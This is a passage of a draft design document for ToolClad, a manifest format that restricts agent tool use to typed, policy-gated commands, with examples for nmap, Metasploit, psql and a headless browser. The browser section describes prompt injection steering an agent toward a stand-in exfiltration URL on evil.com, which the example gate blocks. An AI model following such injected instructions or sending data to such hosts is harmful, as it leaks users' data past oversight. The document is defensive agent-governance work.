# ToolClad: Declarative Tool Interface Contracts for Agentic Runtimes

**Version**: 0.4.0
**Status**: Draft Design Document
**Author**: Jascha Wanger / ThirdKey AI
**Date**: 2026-03-20
**License**: MIT (protocol specification), Apache 2.0 (Symbiont integration)

---

## Problem Statement

Every team building agentic systems hits the same wall: "How do I safely let an agent use my CLI tool?" The current answer is "write custom glue code." For each tool, you write a wrapper script (argument sanitization, timeout enforcement, output parsing, evidence capture), define Rust structs for MCP tool registration, implement the tool function, register it with Cedar resource/action mappings, add it to the agent DSL capabilities, write Cedar policies, and optionally write an output parser. That is a 7-step process per tool. It does not scale.

In Symbiont specifically, DSL agents reference tool names (`tool.nmap_scan`, `capabilities = ["tool.nmap_scan"]`) but there is no standard mechanism for the runtime to dispatch those references to actual executables. Users must wire tool dispatch in Rust code. This is the single largest barrier to adoption for non-Rust users who want to wrap existing CLI tools (security tools, data pipelines, devops automation, compliance checkers).

The broader ecosystem has no answer either. OpenShell/NemoClaw sandboxes agent execution and intercepts dangerous syscalls, but that is a deny-list firewall operating after the agent has already formulated an arbitrary shell command. There is no protocol for declaring what a tool accepts, how to invoke it safely, and what it produces.

---

## What ToolClad Is

ToolClad is a declarative manifest format (`.clad.toml`) that defines the complete behavioral contract for a tool: its typed parameters, validation rules, invocation mechanism, output parsing, and metadata for policy integration. A single manifest file replaces wrapper scripts, MCP tool schemas, and execution wiring.

A ToolClad manifest answers four questions:

1. **What can this tool accept?** Typed parameters with validation constraints (enums, ranges, regex, scope checks, injection sanitization).
2. **How do you invoke it?** A command template that interpolates validated parameters. The LLM never generates a command string.
3. **What does it produce?** Output format declaration, parsing rules, and a mandatory output schema that normalize raw tool output into structured JSON. The LLM knows the shape of results before proposing a call.
4. **What is the interaction model?** Three execution modes share a common governance layer:
   - **Oneshot** (default): Execute a single command, return results.
   - **Session**: Maintain a running CLI process (PTY) where each interaction is independently validated and policy-gated.
   - **Browser**: Maintain a governed headless browser session where navigation, clicks, form submission, and JS execution are typed, scoped, and policy-gated.

A universal executor reads the manifest, validates arguments against declared types, dispatches to the appropriate backend (shell command, PTY session, or browser engine), executes with timeout and resource controls, parses output, and wraps everything in a standard evidence envelope.

---

## The Security Model

ToolClad inverts the security model of sandbox-based approaches.

**Sandbox approach (OpenShell/NemoClaw):**

```
LLM generates shell command -> sandbox intercepts -> allow/deny
```

The agent formulates an arbitrary command string. The sandbox pattern-matches against known-dangerous operations. This is a deny-list. Deny-lists have gaps by definition.

**ToolClad approach:**

```
LLM fills typed parameters -> Cedar Gate evaluates policy ->
  executor validates args against manifest -> constructs command
  from template -> executes in sandbox -> parses output ->
  structured JSON back to agent
```

The agent never sees or generates a command string. It fills in typed fields. The manifest constrains the parameter space to only valid values. This is an allow-list. The dangerous action cannot be expressed because the interface does not permit it.

The manifest enables three properties that unstructured shell execution cannot:

- **Static analysis**: You can determine what any tool can possibly do before it ever runs, by inspecting the manifest. Cedar policies can reference manifest-declared properties.
- **Formal verification**: The parameter space is finite and enumerable for enum types, bounded for numeric types, and regex-constrained for string types. You can prove properties about valid invocations.
- **Automatic policy generation**: A tool with a `target` parameter of type `scope_target` inherently requires scope authorization. Cedar policies can be derived from manifests.

**For interactive tools, the security gap is even wider:**

```
Sandbox approach:    LLM types into PTY -> sandbox intercepts syscalls -> allow/deny
ToolClad sessions:   LLM selects session command -> Gate validates pattern + scope + state
                       -> SessionExecutor sends to PTY -> output framed and schema-validated
```

Sandboxing an interactive tool treats the entire session as a black box. An agent with an open `psql` connection could `DROP TABLE` as easily as `SELECT *` because both are text sent to a PTY. ToolClad session mode declares which commands are allowed (`[session.commands]`), validates each one against a regex pattern, applies independent Cedar policy evaluation per interaction, and tracks session state so policies can reference *where in the session* the agent is. The interactive tool becomes a typed, state-aware, policy-gated API surface.

**For browser agents, the gap is critical:**

```
Current browser agents:  LLM generates CDP/Playwright actions -> hope it stays on-task
ToolClad browser mode:   LLM selects browser command -> Gate validates URL scope + state
                           -> BrowserExecutor sends CDP command -> page state captured
```

Browser agents today (Claude in Chrome, OpenAI Operator, Playwright-based agents) rely on the LLM's instruction-following to stay on allowed domains, avoid submitting sensitive forms, and not execute arbitrary JavaScript. That is prompt-based security. ToolClad browser mode makes it structural: navigation URLs are scope-checked against an allow-list of domains, form submission requires human approval, and JS execution is a separately gated high-risk command. The governance layer is identical to session mode; only the transport differs.

---

## Manifest Format

### Minimal Example

```toml
# tools/whois_lookup.clad.toml
[tool]
name = "whois_lookup"
version = "1.0.0"
binary = "whois"
description = "WHOIS domain/IP registration lookup"
timeout_seconds = 30
risk_tier = "low"

[tool.cedar]
resource = "PenTest::ScanTarget"
action = "execute_tool"

[args.target]
position = 1
required = true
type = "scope_target"
description = "Domain name or IP address to query"

[command]
template = "whois {target}"

[output]
format = "text"
envelope = true

[output.schema]
type = "object"

[output.schema.properties.raw_output]
type = "string"
description = "Raw WHOIS registration data"
```

### Full Example

```toml
# tools/nmap_scan.clad.toml
[tool]
name = "nmap_scan"
version = "1.0.0"
binary = "nmap"
description = "Network port scanning and service detection"
timeout_seconds = 600
risk_tier = "low"

[tool.cedar]
resource = "PenTest::ScanTarget"
action = "execute_tool"

[tool.evidence]
output_dir = "{evidence_dir}/{scan_id}-nmap"
capture = true
hash = "sha256"

# --- Parameters ---

[args.target]
position = 1
required = true
type = "scope_target"
description = "Target CIDR, IP, or hostname"

[args.scan_type]
position = 2
required = true
type = "enum"
allowed = ["ping", "service", "version", "syn", "os_detect", "aggressive", "vuln_script"]
description = "Type of scan to perform"

[args.extra_flags]
position = 3
required = false
type = "string"
sanitize = ["injection"]
default = ""
description = "Additional nmap flags (must pass Gate approval)"

# --- Command Construction ---

[command]
template = "nmap {_scan_flags} --max-rate {max_rate} -oX {_output_file} --no-stylesheet -v {extra_flags} {target}"

[command.defaults]
max_rate = 1000

[command.mappings.scan_type]
ping = "-sn -PE"
service = "-sT -sV --version-intensity 5"
version = "-sV --version-all --top-ports 1000"
syn = "-sS --top-ports 1000"
os_detect = "-sS -O --osscan-guess"
aggressive = "-A -T4 --top-ports 10000"
vuln_script = "-sV --script=vuln --script-timeout 60s"

# --- Output ---

[output]
format = "xml"
parser = "builtin:xml"
# OR: parser = "scripts/parse-outputs/parse-nmap-xml.py"
envelope = true

[output.schema]
type = "object"

[output.schema.properties.hosts]
type = "array"
description = "Discovered hosts with open ports and services"

[output.schema.properties.hosts.items.properties.ip]
type = "string"

[output.schema.properties.hosts.items.properties.ports]
type = "array"

[output.schema.properties.hosts.items.properties.ports.items.properties.port]
type = "integer"

[output.schema.properties.hosts.items.properties.ports.items.properties.protocol]
type = "string"

[output.schema.properties.hosts.items.properties.ports.items.properties.service]
type = "string"

[output.schema.properties.hosts.items.properties.ports.items.properties.version]
type = "string"
```

### Complex Example with Escape Hatch

```toml
# tools/metasploit_run.clad.toml
[tool]
name = "metasploit_run"
version = "1.0.0"
binary = "msfconsole"
description = "Metasploit Framework module execution"
timeout_seconds = 900
risk_tier = "high"
human_approval = true

[tool.cedar]
resource = "PenTest::ScanTarget"
action = "execute_tool"

[tool.evidence]
output_dir = "{evidence_dir}/{scan_id}-msf"
capture = true
hash = "sha256"

[args.module]
position = 1
required = true
type = "string"
pattern = "^(exploit|auxiliary|post)/[a-zA-Z0-9_/]+$"
description = "Metasploit module path"

[args.target]
position = 2
required = true
type = "scope_target"
description = "Target IP or hostname (RHOSTS)"

[args.port]
position = 3
required = false
type = "port"
default = 0
description = "Target port (RPORT)"

[args.payload]
position = 4
required = true
type = "string"
pattern = "^(cmd|generic|java|linux|osx|php|python|ruby|windows)/[a-zA-Z0-9_/]+$"
description = "Payload module path"

[args.lhost]
position = 5
required = true
type = "ip_address"
description = "Listener IP (LHOST)"

[args.lport]
position = 6
required = false
type = "port"
default = 4444
description = "Listener port (LPORT)"

[args.options]
position = 7
required = false
type = "msf_options"
description = "Additional set KEY VALUE options, semicolon-delimited"

# Escape hatch: this tool has session detection and module validation
# logic that exceeds what the template engine can express.
[command]
executor = "scripts/tool-wrappers/msf-wrapper.sh"

[output]
format = "text"
parser = "scripts/parse-outputs/parse-msf.py"
envelope = true

[output.schema]
type = "object"

[output.schema.properties.sessions]
type = "array"
description = "Established Metasploit sessions"

[output.schema.properties.sessions.items.properties.session_id]
type = "integer"

[output.schema.properties.sessions.items.properties.type]
type = "string"
description = "Session type (meterpreter, shell, etc.)"

[output.schema.properties.sessions.items.properties.target]
type = "string"

[output.schema.properties.module_output]
type = "string"
description = "Raw module execution output"
```

---

## Type System

Built-in validation types cover the patterns repeated across all existing wrapper scripts. Every type includes injection sanitization (shell metacharacter rejection) by default. Types are designed so that "valid according to the type" means "safe to interpolate into a shell command."

### Core Types

| Type | Validates | Examples |
|------|-----------|---------|
| `string` | Non-empty, injection-safe | General text arguments |
| `integer` | Numeric, optional `min`/`max` with clamping | Thread counts, retry limits |
| `port` | Numeric, 1-65535 | Network ports |
| `boolean` | Exactly `"true"` or `"false"` | Feature flags |
| `enum` | Value in declared `allowed` list | Scan types, protocols, severity levels |
| `scope_target` | Injection-safe + scope validation + block wildcards | IPs, CIDRs, hostnames |
| `url` | Valid URL structure, host extracted for scope validation | Web application targets |
| `path` | No traversal (`../`), optionally must exist | Wordlists, config files, output dirs |
| `ip_address` | Valid IPv4 or IPv6 | Listener addresses, bind addresses |
| `cidr` | Valid CIDR notation | Network ranges |

### Extended Types

| Type | Validates | Use Case |
|------|-----------|----------|
| `msf_options` | Semicolon-delimited `set KEY VALUE` pairs, no shell metacharacters | Metasploit extra options |
| `credential_file` | Path type + must exist + read-only check | Username/password lists |
| `duration` | Integer with suffix (s/m/h) or bare seconds | Timeout overrides |
| `regex_match` | Matches a declared `pattern` (PCRE) | Module paths, format strings |

### Type Composition

Types can be extended with additional constraints:

```toml
[args.threads]
type = "integer"
min = 1
max = 64
clamp = true       # Values outside range are clamped, not rejected
default = 4
description = "Concurrent threads"

[args.service]
type = "enum"
allowed = ["ssh", "ftp", "http-get", "http-post-form", "smb", "rdp", "mysql", "postgres"]
description = "Target service protocol"

[args.target_url]
type = "url"
schemes = ["http", "https"]       # Only these URL schemes
scope_check = true                 # Extract host for scope validation
description = "Target web application URL"

[args.module_path]
type = "string"
pattern = "^(exploit|auxiliary|post)/[a-zA-Z0-9_/]+$"
sanitize = ["injection"]
description = "Metasploit module path"
```

### Custom Types

Projects can define reusable custom types in a `toolclad.toml` at the project root:

```toml
# toolclad.toml -- project-level ToolClad configuration

[types.service_protocol]
base = "enum"
allowed = ["ssh", "ftp", "http", "https", "smb", "rdp", "mysql", "postgres", "mssql", "vnc"]

[types.severity_level]
base = "enum"
allowed = ["info", "low", "medium", "high", "critical"]

[types.nuclei_template_id]
base = "string"
pattern = "^[a-zA-Z0-9_-]+(/[a-zA-Z0-9_-]+)*$"
```

Then reference them in tool manifests:

```toml
[args.service]
type = "service_protocol"
```

---

## Command Construction

The command template is the core mechanism that prevents LLMs from generating arbitrary shell commands. The template is a string with `{placeholder}` references that are interpolated with validated parameter values.

### Template Variables

| Variable | Source |
|----------|--------|
| `{arg_name}` | Validated parameter value |
| `{_scan_flags}` | Resolved from `[command.mappings]` |
| `{_output_file}` | Auto-generated evidence output path |
| `{_scan_id}` | Auto-generated scan/invocation ID |
| `{_evidence_dir}` | Evidence directory from runtime config |

Variables prefixed with `_` are injected by the executor, not provided by the agent.

### Mappings

Mappings translate logical parameter values to actual CLI flags:

```toml
[command.mappings.scan_type]
ping = "-sn -PE"
service = "-sT -sV --version-intensity 5"
syn = "-sS --top-ports 1000"
```

The template references the mapped value as `{_scan_flags}` (derived from `scan_type`). The naming convention: `_{arg_name}_flags` or a custom name declared in the mapping.

### Conditional Sections

For tools where some flags are only present when certain parameters are set:

```toml
[command]
template = "hydra {_service_flags} {_credential_flags} {_thread_flags} {target}"

[command.conditionals]
# Only include -s PORT if port != 0
service_port = { when = "port != 0", template = "-s {port}" }
# Only include -L/-P if files are provided
username_file = { when = "username_file != ''", template = "-L {username_file}" }
password_file = { when = "password_file != ''", template = "-P {password_file}" }
# Only include -l/-p if single credentials are provided
single_user = { when = "username != '' and username_file == ''", template = "-l {username}" }
single_pass = { when = "password != '' and password_file == ''", template = "-p {password}" }
```

### Escape Hatch

When a tool's invocation logic exceeds what the template engine can express, the manifest can delegate to a custom executor:

```toml
[command]
executor = "scripts/tool-wrappers/msf-wrapper.sh"
```

The custom executor receives validated, typed arguments as environment variables (`TOOLCLAD_ARG_MODULE`, `TOOLCLAD_ARG_TARGET`, etc.) and the standard executor variables (`TOOLCLAD_SCAN_ID`, `TOOLCLAD_OUTPUT_DIR`, `TOOLCLAD_EVIDENCE_DIR`). It still benefits from:

- Parameter validation (before the executor is called)
- Scope enforcement (on scope_target args)
- Timeout enforcement (the executor is wrapped in a process timeout)
- Evidence envelope (the executor's stdout is captured and wrapped)
- Cedar policy evaluation (before anything executes)

The escape hatch is for command construction only. All other ToolClad guarantees still apply.

---

## Output Handling

### Built-in Parsers

| Parser | Produces | Use Case |
|--------|----------|----------|
| `builtin:json` | Passes through as-is | Tools with native JSON output |
| `builtin:xml` | Converts to JSON | nmap, Nessus, OWASP ZAP |
| `builtin:csv` | Array of objects | Spreadsheet exports, log files |
| `builtin:text` | `{ "raw_output": "..." }` | Simple tools with unstructured output |
| `builtin:jsonl` | Array of JSON objects | Nuclei, streaming tools |

### Custom Parsers

```toml
[output]
parser = "scripts/parse-outputs/parse-nmap-xml.py"
```

Custom parsers receive the raw output file path as argv[1] and must emit JSON to stdout. The parser's output is validated against the declared `[output.schema]` before it reaches the agent.

### Output Schema (Mandatory)

Every manifest must declare the expected shape of its parsed results in `[output.schema]`. This serves two purposes:

1. **MCP `outputSchema` generation**: The LLM sees what data shape it will receive *before* proposing a tool call. This enables more effective reasoning about whether and how to use a tool.
2. **Parser output validation**: The executor validates parsed results against the schema. Malformed parser output is rejected before it reaches the agent, preventing corrupted state in the ORGA loop.

```toml
[output.schema]
type = "object"

[output.schema.properties.hosts]
type = "array"
description = "Discovered hosts with open ports and services"

[output.schema.properties.hosts.items.properties.ip]
type = "string"
description = "Host IP address"

[output.schema.properties.hosts.items.properties.hostname]
type = "string"
description = "Resolved hostname (if available)"

[output.schema.properties.hosts.items.properties.ports]
type = "array"
description = "Open ports with service details"

[output.schema.properties.hosts.items.properties.ports.items.properties.port]
type = "integer"

[output.schema.properties.hosts.items.properties.ports.items.properties.protocol]
type = "string"

[output.schema.properties.hosts.items.properties.ports.items.properties.service]
type = "string"

[output.schema.properties.hosts.items.properties.ports.items.properties.version]
type = "string"
```

For tools with simple or opaque output, a minimal schema is acceptable:

```toml
# Simple text tool
[output.schema]
type = "object"

[output.schema.properties.raw_output]
type = "string"
description = "Raw command output text"
```

The schema is intentionally JSON Schema-compatible so it maps directly to MCP `outputSchema` with no transformation. The same schema definition feeds both the LLM (via MCP) and the executor (for validation).

### Evidence Envelope

When `envelope = true` (default), the executor wraps parsed output in a standard envelope:

```json
{
  "status": "success",
  "scan_id": "1711929600-12345",
  "tool": "nmap_scan",
  "command": "nmap -sT -sV --max-rate 1000 -oX /evidence/... 10.0.1.0/24",
  "duration_ms": 4523,
  "timestamp": "2026-03-20T12:00:00Z",
  "output_file": "/evidence/1711929600-12345-nmap/scan.xml",
  "output_hash": "sha256:a1b2c3...",
  "results": { ... }
}
```

This is the JSON the agent receives. Every field is deterministic and machine-readable. The `output_hash` provides tamper detection for the evidence chain. The `results` field contains the parsed output, validated against the declared `[output.schema]`.

---

## Stateful Sessions: CLI and Browser

Beyond oneshot execution, ToolClad supports stateful sessions where a tool process stays alive across multiple agent interactions. The key design insight: the governance layer (typed commands, per-interaction Cedar gating, scope enforcement, state-aware policies, output schema validation, evidence capture) is transport-agnostic. What changes between session types is the transport backend.

| Mode | Backend | State Source | Ready Signal | Use Case |
|---|---|---|---|---|
| `oneshot` | Shell command | N/A | Process exit | Single invocations (nmap, curl, jq) |
| `session` | PTY (pseudo-terminal) | Prompt regex parsing | Prompt pattern match | Interactive CLIs (msfconsole, psql, gdb) |
| `browser` | CDP / Playwright API | URL + DOM inspection | Page load + network idle | Web interaction (testing, scraping, form filling) |

All three share: typed commands, per-interaction Cedar policy evaluation, scope enforcement, output schema validation, evidence capture, and audit trail. The manifest format is the same. The executor implementation differs.

### The Problem with Stateful Tools

Tools like `msfconsole`, `psql`, `redis-cli`, headless browsers, and cloud CLI interactive modes maintain a running process that accepts commands over time. The oneshot model (validate, construct, execute, parse) does not fit because:

1. The tool stays alive across multiple agent interactions
2. Each interaction changes the tool's internal state (loaded module, connected database, current page)
3. The agent needs to see intermediate output to decide its next command
4. Different commands within the same session carry different risk levels

Sandboxing the entire process treats the session as a black box. It can block dangerous syscalls but cannot govern *what the agent says* to the tool. An agent with an open `psql` session could `DROP TABLE` as easily as `SELECT *`. An agent with a browser could navigate to any domain. ToolClad stateful sessions declare which commands are allowed, validate each one independently, and gate every interaction through Cedar policy evaluation.

---

### CLI Session Mode

CLI session mode manages interactive command-line tools through a PTY (pseudo-terminal). The agent sends typed, validated commands to a running process and receives structured output parsed from the terminal stream.

#### Per-Interaction ORGA Gating

Session mode turns each round of interaction into its own ORGA cycle:

```
Iteration 1:
  Observe:  "psql is ready, showing dbname=> prompt"
  Reason:   LLM proposes "SELECT * FROM users LIMIT 10"
  Gate:     Cedar checks: is SELECT allowed? Is this agent read-only?
            ToolClad validates: command matches read_query pattern
  Act:      SessionExecutor sends command to PTY, waits for next prompt

Iteration 2:
  Observe:  "Query returned 10 rows, showing dbname=> prompt"
  Reason:   LLM proposes "DROP TABLE users"
  Gate:     Cedar checks: is DROP allowed? -> DENY
  Act:      (blocked, denial fed back to agent)
```

Every command the agent sends to the interactive tool passes through Cedar policy evaluation and ToolClad pattern validation. The LLM cannot free-type into a terminal. It selects from declared, validated, policy-gated operations.

#### Session Manifest

```toml
# tools/msfconsole.clad.toml
[tool]
name = "msfconsole_session"
binary = "msfconsole"
mode = "session"
description = "Interactive Metasploit Framework session"
risk_tier = "high"

[tool.cedar]
resource = "PenTest::ScanTarget"
action = "execute_tool"

[tool.evidence]
output_dir = "{evidence_dir}/{session_id}-msf"
capture = true
hash = "sha256"

# --- Session Lifecycle ---

[session]
startup_command = "msfconsole -q -x 'color false'"
ready_pattern = "^msf[0-9].*> $"
startup_timeout_seconds = 30
idle_timeout_seconds = 300
session_timeout_seconds = 1800
max_interactions = 100

[session.interaction]
input_sanitize = ["injection"]
output_max_bytes = 1048576
output_wait_ms = 2000

# --- Session Commands (the allow-list) ---
# Each command becomes an MCP tool: msfconsole_session.use_module, etc.

[session.commands.use_module]
pattern = "^use (exploit|auxiliary|post)/[a-zA-Z0-9_/]+$"
description = "Load a Metasploit module"
risk_tier = "medium"

[session.commands.set_option]
pattern = "^set [A-Za-z0-9_]+ .+$"
description = "Set a module option"
risk_tier = "low"

[session.commands.set_target]
pattern = "^set RHOSTS .+$"
description = "Set the target"
extract_target = true
risk_tier = "medium"

[session.commands.run]
pattern = "^(run|exploit)$"
description = "Execute the loaded module"
risk_tier = "high"
human_approval = true

[session.commands.sessions_list]
pattern = "^sessions -l$"
description = "List active sessions"
risk_tier = "low"

# --- Output Schema ---

[output.schema]
type = "object"

[output.schema.properties.prompt]
type = "string"
description = "Current tool prompt (indicates internal state)"

[output.schema.properties.output]
type = "string"
description = "Tool output from the last command"

[output.schema.properties.session_state]
type = "string"
enum = ["ready", "module_loaded", "configured", "running", "completed", "error"]
description = "Inferred session state from prompt analysis"

[output.schema.properties.interaction_count]
type = "integer"
description = "Number of interactions in this session so far"
```

#### Session Commands as Typed MCP Tools

The `[session.commands]` section is the critical difference from open-ended terminal access. Each declared command becomes a separate MCP tool visible to the LLM during the session:

| MCP Tool Name | LLM Sees | Agent Provides |
|---|---|---|
| `msfconsole_session.use_module` | "Load a Metasploit module" | `{ "command": "use exploit/windows/smb/ms17_010" }` |
| `msfconsole_session.set_target` | "Set the target" | `{ "command": "set RHOSTS 10.0.1.5" }` |
| `msfconsole_session.run` | "Execute the loaded module" | `{ "command": "run" }` |

The LLM never sees a free-text input field. It picks from typed operations. The parameter is validated against the command's `pattern` regex, scope-checked if `extract_target = true`, and policy-gated at the command's declared `risk_tier`. A command that does not match any declared pattern is rejected before it reaches the PTY.

#### Prompt-Based State Inference

The `ready_pattern` regex tells the SessionExecutor when the tool is waiting for input. But different prompts reveal different internal states:

| Prompt | Inferred State |
|---|---|
| `msf6 >` | `ready` (no module loaded) |
| `msf6 exploit(ms17_010) >` | `module_loaded` |
| `msf6 exploit(ms17_010) > [*] ...` | `running` |
| `dbname=>` | `ready` (psql, connected) |
| `dbname=#` | `ready` (psql, superuser, higher risk tier) |

The executor parses prompt changes and reports `session_state` in the output schema. Cedar policies can reference session state for authorization decisions:

```cedar
// Only allow "run" when module is configured
permit (
    principal == PenTest::Phase::"exploit",
    action == PenTest::Action::"execute_tool",
    resource
)
when {
    resource.tool_name == "msfconsole_session.run" &&
    resource.session_state == "configured"
};
```

This means Cedar governs not just *what* the agent can do, but *when* in the session it can do it. State-aware, interaction-count-aware, time-aware governance on an interactive tool, all evaluated outside LLM influence.

#### SessionExecutor Architecture

The SessionExecutor manages the tool process via a PTY (pseudo-terminal):

```
Agent ORGA Loop              SessionExecutor                Tool Process (PTY)
     |                            |                              |
     |  propose command           |                              |
     |--------------------------->|                              |
     |                            |  validate against pattern    |
     |                            |  check scope (if extract)    |
     |                            |  Cedar policy evaluation     |
     |                            |                              |
     |                     [if allowed]                          |
     |                            |  write to PTY stdin          |
     |                            |----------------------------->|
     |                            |                              |
     |                            |  read until ready_pattern    |
     |                            |<-----------------------------|
     |                            |                              |
     |                            |  parse prompt -> state       |
     |                            |  frame output                |
     |                            |  validate against schema     |
     |                            |  wrap in evidence envelope   |
     |                            |                              |
     |  {prompt, output, state}   |                              |
     |<---------------------------|                              |
     |                            |                              |
  [next ORGA iteration]
```

The SessionExecutor handles:

- **PTY allocation and management**: Spawns the tool in a pseudo-terminal, handles SIGWINCH, manages process lifecycle
- **Prompt detection**: Watches stdout for `ready_pattern` matches to know when the tool is waiting for input vs. still producing output
- **Output framing**: Extracts the meaningful output between the sent command and the next prompt, stripping echoed input and ANSI escape codes
- **State inference**: Parses prompt changes to update `session_state`
- **Timeout enforcement**: Kills the session if `idle_timeout`, `session_timeout`, or `max_interactions` are exceeded
- **Evidence capture**: Logs the full session transcript with timestamps, command/response pairs, and policy decisions for the cryptographic audit trail

#### Session Lifecycle

```
spawn -> startup -> ready -> interact -> ... -> terminate
  |                   |         |                    |
  |  startup_command  |  agent  |  idle_timeout      |
  |  wait for         |  sends  |  session_timeout   |
  |  ready_pattern    |  cmds   |  max_interactions  |
  |                   |         |  explicit close     |
  |  startup_timeout  |         |  agent terminates   |
  |  exceeded? FAIL   |         |                    |
```

Sessions are scoped to a single agent ORGA loop. When the loop completes (task done, timeout, or error), the SessionExecutor terminates the process and finalizes the evidence transcript. Sessions do not persist across agent restarts. This is deliberate: a session is an ephemeral execution context, not durable state.

#### CLI Session Applications

Session mode applies to any interactive tool where governance matters:

| Tool | Session Commands | Governance Value |
|---|---|---|
| `psql` / `mysql` | `select_query`, `insert`, `update`, `create_table`, `drop_table` | Read-only agents cannot mutate. DDL requires human approval. |
| `redis-cli` | `get`, `set`, `del`, `keys`, `flushdb` | Agents can read/write keys but `flushdb` requires approval. |
| `kubectl exec` | `get`, `describe`, `logs`, `delete`, `apply` | Agents can inspect but destructive operations are gated. |
| `gdb` / `lldb` | `info`, `backtrace`, `print`, `set`, `continue`, `kill` | Agents can inspect state but `set` and `kill` are gated. |
| `aws` / `gcloud` | Subcommand-specific patterns | Read operations allowed, write/delete operations gated by resource type. |
| `python3` / `node` | REPL commands with import restrictions | Agent can compute but cannot import `os`, `subprocess`, `socket`. |

---

### Browser Mode

Browser mode manages headless browser sessions through CDP (Chrome DevTools Protocol) or Playwright. The governance model is identical to CLI session mode: typed commands, per-interaction Cedar gating, scope enforcement, state-aware policies, output schema validation, evidence capture. The transport is a browser engine instead of a PTY.

#### Why Browser Agents Need Structural Governance

Browser agents today (Claude in Chrome, OpenAI Operator, Playwright-based automation) rely on the LLM's instruction-following to stay on allowed domains, avoid submitting sensitive forms, and not execute arbitrary JavaScript. That is prompt-based security. A single prompt injection on a visited page can redirect the agent to an attacker-controlled domain, exfiltrate form data, or execute malicious scripts.

ToolClad browser mode makes navigation, interaction, and execution structurally governed:

- **URL scope enforcement**: Navigation targets are validated against an allow-list of domains before the CDP command fires. The agent cannot navigate outside scope regardless of what the LLM proposes.
- **Command-level risk tiering**: Reading page content is low risk. Clicking a link is low risk. Submitting a form is high risk. Executing JavaScript is high risk and requires human approval. Each action is a separate typed command with its own Cedar policy.
- **Page state as policy context**: Cedar policies can reference the current URL, domain, authentication status, and form presence. Rules like "block form submission on authenticated pages without human approval" are expressible.

#### Browser Manifest

```toml
# tools/browser.clad.toml
[tool]
name = "browser_session"
mode = "browser"
description = "Governed headless browser session"
risk_tier = "medium"

[tool.cedar]
resource = "Web::BrowserSession"
action = "browse"

[tool.evidence]
output_dir = "{evidence_dir}/{session_id}-browser"
capture = true
hash = "sha256"
screenshots = true

# --- Browser Lifecycle ---

[browser]
engine = "playwright"
headless = true
startup_timeout_seconds = 10
session_timeout_seconds = 600
idle_timeout_seconds = 120
max_interactions = 200

# Scope enforcement on navigation
[browser.scope]
allowed_domains = ["*.example.com", "docs.example.com"]
blocked_domains = ["*.evil.com", "admin.*"]
allow_external = false

# --- Browser Commands ---

[browser.commands.navigate]
description = "Navigate to a URL"
risk_tier = "medium"
args.url = { type = "url", schemes = ["https"], scope_check = true }

[browser.commands.click]
description = "Click an element by CSS selector"
risk_tier = "low"
args.selector = { type = "string", pattern = "^[a-zA-Z0-9_.#\\[\\]=\"' >:()-]+$" }

[browser.commands.type_text]
description = "Type text into an input field"
risk_tier = "low"
args.selector = { type = "string" }
args.text = { type = "string", sanitize = ["injection"] }

[browser.commands.submit_form]
description = "Submit a form"
risk_tier = "high"
human_approval = true
args.selector = { type = "string" }

[browser.commands.extract]
description = "Extract text content from elements"
risk_tier = "low"
args.selector = { type = "string" }

[browser.commands.screenshot]
description = "Capture page screenshot"
risk_tier = "low"

[browser.commands.execute_js]
description = "Execute JavaScript on the page"
risk_tier = "high"
human_approval = true
args.script = { type = "string" }

[browser.commands.wait_for]
description = "Wait for an element to appear"
risk_tier = "low"
args.selector = { type = "string" }
args.timeout_ms = { type = "integer", min = 100, max = 30000, default = 5000 }

[browser.commands.go_back]
description = "Navigate back in browser history"
risk_tier = "low"

# --- State Inference ---

[browser.state]
fields = ["url", "title", "domain", "has_forms", "is_authenticated", "page_loaded"]

# --- Output Schema ---

[output.schema]
type = "object"

[output.schema.properties.url]
type = "string"
description = "Current page URL after command"

[output.schema.properties.title]
type = "string"
description = "Current page title"

[output.schema.properties.domain]
type = "string"
description = "Current page domain (for policy context)"

[output.schema.properties.content]
type = "string"
description = "Extracted text or command result"

[output.schema.properties.screenshot_path]
type = "string"
description = "Path to screenshot evidence if captured"

[output.schema.properties.page_state]
type = "object"
description = "Inferred page state for Cedar policy context"

[output.schema.properties.page_state.properties.has_forms]
type = "boolean"

[output.schema.properties.page_state.properties.is_authenticated]
type = "boolean"

[output.schema.properties.page_state.properties.page_loaded]
type = "boolean"

[output.schema.properties.interaction_count]
type = "integer"
```

#### Per-Interaction ORGA Gating (Browser)

The ORGA loop works identically to CLI session mode. The transport differs; the governance is the same:

```
Iteration 1:
  Observe:  {url: "https://app.example.com/login", title: "Login", has_forms: true}
  Reason:   LLM proposes browser_session.type_text(selector="#email", text="user@co.com")
  Gate:     Cedar: is type_text allowed? ToolClad: selector matches pattern, text is injection-safe
  Act:      BrowserExecutor sends Playwright command, waits for page stable

Iteration 2:
  Observe:  {url: "https://app.example.com/login", title: "Login"}
  Reason:   LLM proposes browser_session.submit_form(selector="#login-form")
  Gate:     Cedar: submit_form requires human_approval -> PENDING
  Act:      (blocked until human approves)

Iteration 3:
  Observe:  {url: "https://app.example.com/dashboard", is_authenticated: true}
  Reason:   LLM proposes browser_session.navigate(url="https://evil.com/exfil?data=...")
  Gate:     ToolClad: URL scope check -> DENY (domain not in allowed_domains)
  Act:      (blocked, denial fed back to agent)
```

#### BrowserExecutor Architecture

The BrowserExecutor wraps Playwright (or CDP directly) and provides the same interface as the SessionExecutor:

```
Agent ORGA Loop              BrowserExecutor               Browser Engine (CDP)
     |                            |                              |
     |  propose command           |                              |
     |--------------------------->|                              |
     |                            |  validate against command    |
     |                            |  check URL scope (if nav)    |
     |                            |  Cedar policy evaluation     |
     |                            |                              |
     |                     [if allowed]                          |
     |                            |  send CDP/Playwright action  |
     |                            |----------------------------->|
     |                            |                              |
     |                            |  wait: page load + idle      |
     |                            |<-----------------------------|
     |                            |                              |
     |                            |  capture: URL, title, DOM    |
     |                            |  infer page state            |
     |                            |  screenshot (if configured)  |
     |                            |  validate against schema     |
     |                            |  wrap in evidence envelope   |
     |                            |                              |
     |  {url, title, content,     |                              |
     |   page_state, screenshot}  |                              |
     |<---------------------------|                              |
     |                            |                              |
  [next ORGA iteration]
```

The BrowserExecutor handles:

- **Browser lifecycle**: Launch, page creation, navigation, cleanup
- **Ready detection**: Waits for page load event + network idle (configurable) instead of prompt regex matching
- **State inference**: Inspects URL, DOM (form presence, auth indicators like session cookies or user profile elements), and page title to populate `page_state` for Cedar policy context
- **Screenshot evidence**: Captures page screenshots at each interaction for the audit trail
- **Scope enforcement**: Intercepts all navigation (including redirects and link clicks) and validates target URLs against `[browser.scope]`
- **Content extraction**: Returns structured page content (text, form values, table data) instead of raw HTML

#### Cedar Policy Examples (Browser)

```cedar
// Allow navigation only to allowed domains
permit (
    principal,
    action == Web::Action::"browse",
    resource
